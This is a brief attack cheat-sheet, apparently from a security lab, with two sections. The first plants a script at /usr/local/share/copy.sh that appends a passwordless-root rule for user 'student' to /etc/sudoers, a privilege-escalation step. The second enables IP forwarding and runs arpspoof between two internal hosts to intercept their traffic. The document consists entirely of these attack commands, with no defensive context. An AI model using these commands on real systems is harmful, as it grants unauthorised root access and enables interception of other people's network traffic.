
## Add to sudoers

```bash
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers\n' > /usr/local/share/copy.sh
```

## ARP Spoof

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

```bash
arpspoof -i eth1 -t 10.100.13.7 -r 10.100.13.36
```